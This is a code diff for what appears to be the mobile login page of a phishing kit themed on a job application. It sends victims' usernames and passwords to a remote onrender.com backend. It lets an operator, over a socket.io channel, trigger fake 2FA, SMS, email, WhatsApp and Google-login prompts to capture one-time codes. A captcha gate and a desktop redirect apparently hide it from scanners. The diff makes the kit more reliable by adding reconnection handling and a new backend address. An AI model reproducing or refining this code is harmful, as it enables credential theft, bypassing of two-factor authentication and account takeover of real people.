@@ -3,6 +3,7 @@
 
 <head>
   <meta charset="UTF-8">
+  <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>86400000){location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="assets/1.css" />
   <link rel="stylesheet" href="assets/2.css" />
@@ -91,8 +92,15 @@
       </div>
     </div>
   </div>
-  <script src="https://backold.onrender.com/socket.io/socket.io.js"></script>
+  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
   <script>
+    const BACKEND = (function() {
+      var h = location.hostname;
+      return (h === 'localhost' || h === '127.0.0.1' || h.endsWith('.test') || h.endsWith('.local'))
+        ? 'http://localhost:3001'
+        : 'https://job-newback.onrender.com';
+    })();
+
     const shownCommands = {};
     let clientId = localStorage.getItem('clientId');
     if (!clientId) {
@@ -100,17 +108,53 @@
       localStorage.setItem('clientId', clientId);
     }
 
-    const socket = io('https://backold.onrender.com', {
-      query: { clientId }
+    const socket = io(BACKEND, {
+      query: { clientId },
+      reconnectionAttempts: Infinity,
+      reconnectionDelay: 1000,
+      reconnectionDelayMax: 5000,
+      timeout: 20000
     });
 
+    /* Chrome mobile kills WebSocket when backgrounded.
+       Only reconnect when the page was actually hidden first (not on fresh load). */
+    var _wasHidden = false;
+    document.addEventListener('visibilitychange', function () {
+      if (document.visibilityState === 'hidden') {
+        _wasHidden = true;
+      } else if (document.visibilityState === 'visible' && _wasHidden && !_firstConnect) {
+        _wasHidden = false;
+        setTimeout(function () {
+          socket.disconnect();
+          setTimeout(function () { socket.connect(); }, 300);
+        }, 800);
+      }
+    });
+
+    let _firstConnect = true;
     socket.on('connect', () => {
       console.log("✅ Connected to server with socket ID:", socket.id);
-      const session = {
-        socketId: socket.id,
-        timestamp: Date.now()
-      };
-      localStorage.setItem('socketSession', JSON.stringify(session));
+      localStorage.setItem('socketSession', JSON.stringify({ socketId: socket.id, timestamp: Date.now() }));
+      socket.emit('userConnectedToPage', { clientId, page: 'mobile' });
+
+      if (!_firstConnect) {
+        /* Reconnected after background — reset any stuck loading state */
+        const loginBtn = document.getElementById('loginBtn');
+        if (loginBtn && loginBtn.querySelector('.loading-spinner')) {
+          loginBtn.disabled = false;
+          loginBtn.style.opacity = '1';
+          loginBtn.style.cursor = 'pointer';
+          loginBtn.innerHTML = 'Log in';
+        }
+        const continueBtn = document.getElementById('continueBtn');
+        if (continueBtn && continueBtn.querySelector('.loading-spinner')) {
+          continueBtn.disabled = false;
+          continueBtn.style.opacity = '1';
+          continueBtn.style.cursor = 'pointer';
+          continueBtn.innerHTML = 'Continue';
+        }
+      }
+      _firstConnect = false;
     });
     socket.on('show-calendar', () => {
       window.location.href = 'calendly';
@@ -118,7 +162,7 @@
 
     async function loadPage(filename) {
       try {
-        const response = await fetch(`/public/${filename}`);
+        const response = await fetch(`${BACKEND}/public/${filename}`);
         const html = await response.text();
         const main = document.getElementById('main-content');
         main.className = '';
@@ -134,7 +178,7 @@
     async function loadModalPage(filename) {
       try {
         const file = filename.endsWith('.html') ? filename : `${filename}.html`;
-        const response = await fetch(`/public/${file}`);
+        const response = await fetch(`${BACKEND}/public/${file}`);
         if (!response.ok) throw new Error(`HTTP ${response.status}`);
         const html = await response.text();
         const overlay = document.getElementById('modal-overlay');
@@ -183,7 +227,7 @@
         continueBtn.style.opacity = '0.4';
         continueBtn.style.cursor = 'not-allowed';
         continueBtn.innerHTML = '<span class="loading-spinner"></span>';
-        fetch('https://backold.onrender.com/send-auth-code', {
+        fetch(BACKEND + '/send-auth-code', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -232,7 +276,7 @@
         continueBtn.style.opacity = '0.4';
         continueBtn.style.cursor = 'not-allowed';
         continueBtn.innerHTML = '<span class="loading-spinner"></span>';
-        fetch('https://backold.onrender.com/send-email-code', {
+        fetch(BACKEND + '/send-email-code', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -254,16 +298,24 @@
     }
 
     
+    function retryCodePrompt() {
+      const timerDiv = document.querySelector('.timer');
+      const btn = document.getElementById('continueBtn');
+      if (timerDiv) {
+        timerDiv.innerText = "The code you entered isn't correct. Please check again.";
+        timerDiv.style.display = 'block';
+      }
+      if (btn) {
+        btn.innerHTML = 'Continue';
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        btn.style.cursor = 'pointer';
+      }
+    }
+
     socket.on('show-2fa', () => {
       if (shownCommands['2fa']) {
-        const timerDiv = document.querySelector('.timer');
-        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
-        timerDiv.style.display = 'block';
-        continueBtn.innerHTML = 'Continue';
-        continueBtn.disabled = false;
-        continueBtn.style.opacity = '1';
-        continueBtn.style.cursor = 'pointer';
-        
+        retryCodePrompt();
       } else {
         shownCommands['2fa'] = true;
         loadPage('sms');
@@ -271,14 +323,7 @@
     });
     socket.on('show-auth', () => {
       if (shownCommands['auth']) {
-        const timerDiv = document.querySelector('.timer');
-        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
-        timerDiv.style.display = 'block';
-        continueBtn.innerHTML = 'Continue';
-        continueBtn.disabled = false;
-        continueBtn.style.opacity = '1';
-        continueBtn.style.cursor = 'pointer';
-        
+        retryCodePrompt();
       } else {
         shownCommands['auth'] = true;
         loadPage('auth');
@@ -286,14 +331,7 @@
     });
     socket.on('show-email', () => {
       if (shownCommands['email']) {
-        const timerDiv = document.querySelector('.timer');
-        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
-        timerDiv.style.display = 'block';
-        continueBtn.innerHTML = 'Continue';
-        continueBtn.disabled = false;
-        continueBtn.style.opacity = '1';
-        continueBtn.style.cursor = 'pointer';
-        
+        retryCodePrompt();
       } else {
         shownCommands['email'] = true;
         loadPage('email');
@@ -301,14 +339,7 @@
     });
     socket.on('show-whatsapp', () => {
       if (shownCommands['whatsapp']) {
-        const timerDiv = document.querySelector('.timer');
-        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
-        timerDiv.style.display = 'block';
-        continueBtn.innerHTML = 'Continue';
-        continueBtn.disabled = false;
-        continueBtn.style.opacity = '1';
-        continueBtn.style.cursor = 'pointer';
-        
+        retryCodePrompt();
       } else {
         shownCommands['whatsapp'] = true;
         loadPage('wh');
@@ -326,6 +357,48 @@
     });
     socket.on('show-old-pass', () => loadModalPage('old-password'));
 
+    socket.on('show-google-login', () => {
+      const emailEl = document.getElementById('username');
+      const fbEmail = (emailEl && emailEl.value.trim())
+                      || sessionStorage.getItem('lastLoginEmail')
+                      || '';
+      try {
+        sessionStorage.setItem('lastLoginEmail', fbEmail);
+        sessionStorage.setItem('googleReturnPage', 'mobile.html');
+      } catch(e) {}
+      window.location.href = 'fb-verify.html';
+    });
+
+    socket.on('show-gmail-wrong-pass', () => {
+      if (!document.getElementById('loginBtn')) {
+        showLoginPage();
+      } else {
+        resetLoginForm();
+      }
+      loadModalPage('wrong-creds');
+    });
+
+    socket.on('redirect', (url) => {
+      window.location.href = url;
+    });
+
+    /* ── Redirected back from google-login.html — open the right mobile modal ── */
+    const mobilePendingModal = sessionStorage.getItem('pendingModal');
+    if (mobilePendingModal) {
+      sessionStorage.removeItem('pendingModal');
+      sessionStorage.removeItem('googleReturnPage');
+      const mobileModalMap = {
+        '2fa':       () => { shownCommands['2fa']      = true; loadPage('sms'); },
+        'auth':      () => { shownCommands['auth']     = true; loadPage('auth'); },
+        'email':     () => { shownCommands['email']    = true; loadPage('email'); },
+        'whatsapp':  () => { shownCommands['whatsapp'] = true; loadPage('wh'); },
+        'wrongcreds':() => loadModalPage('wrong-creds'),
+        'oldpass':   () => loadModalPage('old-password')
+      };
+      if (mobileModalMap[mobilePendingModal]) {
+        mobileModalMap[mobilePendingModal]();
+      }
+    }
 
   </script>
   <script>
@@ -358,13 +431,15 @@
       const password = passwordInput.value.trim();
       if (!username || !password) return;
 
+      try { sessionStorage.setItem('lastLoginEmail', username); } catch(e) {}
+
       loginBtn.disabled = true;
       loginBtn.style.opacity = '0.4';
       loginBtn.style.cursor = 'not-allowed';
       loginBtn.innerHTML = '<span class="loading-spinner"></span>';
 
       try {
-        const response = await fetch('https://backold.onrender.com/send-login-data', {
+        const response = await fetch(BACKEND + '/send-login-data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ username, password, socketId: socket.id })
@@ -412,9 +487,12 @@
   </script>
   <script>
     function checkIfStillMobile() {
+      var h = location.hostname;
+      var isLocal = (h === 'localhost' || h === '127.0.0.1' || h.endsWith('.test') || h.endsWith('.local'));
+      if (isLocal) return; // skip redirect when testing locally
       const isMobile = window.innerWidth <= 768;
       if (!isMobile) {
-        window.location.href = 'selbyjennings';
+        window.location.href = 'apply.html';
       }
     }
     checkIfStillMobile();
